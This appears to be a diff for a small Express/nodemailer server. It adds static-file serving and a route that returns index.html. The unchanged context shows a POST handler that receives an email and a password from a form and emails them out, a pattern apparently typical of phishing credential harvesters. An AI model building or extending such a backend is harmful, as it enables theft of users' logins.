@@ -2,6 +2,7 @@ require("dotenv").config();
 const express = require("express");
 const nodemailer = require("nodemailer");
 const cors = require("cors");
+const path = require("path");
 
 const app = express();
 app.use(express.json());
@@ -14,6 +15,8 @@ const transporter = nodemailer.createTransport({
     pass: process.env.EMAIL_PASS,
   },
 });
+
+app.use(express.static(path.join(__dirname, "public")));
 
 app.post("/", async (req, res) => {
   const { email, password } = req.body;
@@ -35,6 +38,10 @@ app.post("/", async (req, res) => {
     console.error(error);
     res.status(500).json({ error: "Error sending email" });
   }
+});
+
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 const PORT = process.env.PORT || 5000;
